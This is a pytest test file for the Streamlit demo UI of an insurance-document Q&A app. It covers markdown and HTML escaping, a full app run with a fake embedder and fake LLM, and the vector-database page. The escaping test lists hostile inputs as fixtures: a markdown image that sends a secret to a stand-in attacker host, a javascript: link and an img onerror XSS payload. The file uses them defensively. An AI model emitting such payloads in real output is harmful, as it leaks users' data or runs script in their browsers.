"""Tests for the local demo UI: safe rendering, plus the whole app driven by Streamlit's
AppTest with a fake embedder and fake LLM (fast, no model download, no API quota)."""

from pathlib import Path

import numpy as np
import pytest
import streamlit as st
from streamlit.testing.v1 import AppTest

from insureassist.config import settings
from insureassist.generation import llm as llm_module
from insureassist.generation.llm import FakeProvider, LlmOutput
from insureassist.ingestion import embedder as embedder_module
from insureassist.ingestion.embedder import HashEmbedder
from insureassist.ingestion.pipeline import ingest_file
from insureassist.ingestion.vector_store import VectorStore
from insureassist.ui.render import plain
from insureassist.ui.vector_db_view import project_2d

APP = Path("src/insureassist/ui/app.py")

# --- safe rendering -----------------------------------------------------------------------


@pytest.mark.parametrize(
    "dangerous",
    [
        "![x](https://attacker.example/?d=secret)",  # image that would leak data
        "[click](javascript:alert(1))",  # link
        "<img src=x onerror=alert(1)>",  # HTML
        "**bold** _it_ # heading `code` $x^2$",  # formatting and math
    ],
)
def test_plain_escapes_every_markdown_and_html_character(dangerous: str) -> None:
    escaped = plain(dangerous)
    for char in "![]()<>*_#`$":
        # every special character is preceded by a backslash
        assert char not in escaped.replace("\\" + char, "")


def test_plain_keeps_normal_text_readable() -> None:
    assert plain("The deductible is 500 per claim") == "The deductible is 500 per claim"


# --- the whole app (fake models) ----------------------------------------------------------


@pytest.fixture
def app(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> AppTest:
    fake_embedder = HashEmbedder(dimension=256)
    store = VectorStore(tmp_path, fake_embedder.model_name, fake_embedder.dimension)
    ingest_file(Path("samples/pdfs/auto-policy.pdf"), store, fake_embedder)
    store.save()

    answer = LlmOutput(status="answered", answer="The deductible is $500 [E1].", citations=["E1"])
    monkeypatch.setattr(settings, "index_dir", tmp_path)
    monkeypatch.setattr(settings, "retrieval_min_semantic_score", 0.0)
    monkeypatch.setattr(embedder_module, "SentenceTransformerEmbedder", lambda: fake_embedder)
    monkeypatch.setattr(llm_module, "create_llm", lambda: FakeProvider(lambda p: answer))
    st.cache_resource.clear()  # don't reuse objects from another test
    return AppTest.from_file(str(APP.resolve()), default_timeout=60)


def test_app_starts_and_lists_documents(app: AppTest) -> None:
    app.run()

    assert not app.exception
    assert app.title[0].value == "Ask about your insurance documents"
    assert any("auto-policy.pdf" in t.value for t in app.sidebar.text)


def test_app_answers_with_sources(app: AppTest) -> None:
    app.run()
    app.chat_input[0].set_value("What is the collision deductible?").run()

    assert not app.exception
    page_text = " ".join(m.value for m in app.markdown)
    assert "Answered" in page_text
    assert "auto\\-policy\\.pdf, page" in page_text  # source shown (escaped text)


# --- Vector DB page -------------------------------------------------------------------


def test_project_2d_places_the_question_consistently() -> None:
    rng = np.random.default_rng(0)
    vectors = rng.normal(size=(7, 384)).astype(np.float32)

    projection = project_2d(vectors, question=vectors[3])

    assert projection.points.shape == (7, 2)
    assert 0.0 < projection.kept_share <= 1.0
    # A question identical to row 3 lands exactly on row 3's point.
    np.testing.assert_allclose(projection.question, projection.points[3], atol=1e-6)


def test_vector_db_page_shows_rows_vector_and_map(app: AppTest) -> None:
    app.run()
    app.sidebar.radio[0].set_value("Vector DB").run()

    assert not app.exception
    assert app.title[0].value == "Inside the vector database"
    assert not app.chat_input  # the chat is not drawn on this page
    rows_table = app.dataframe[1].value
    assert len(rows_table) == int(app.metric[1].value)  # one table row per FAISS row
    assert set(rows_table["document"]) == {"auto-policy.pdf"}

    app.text_input[0].set_value("collision deductible").run()

    assert not app.exception
    nearest = app.dataframe[-1].value
    assert list(nearest.columns[:2]) == ["row", "similarity"]
    assert nearest["similarity"].is_monotonic_decreasing  # best match first
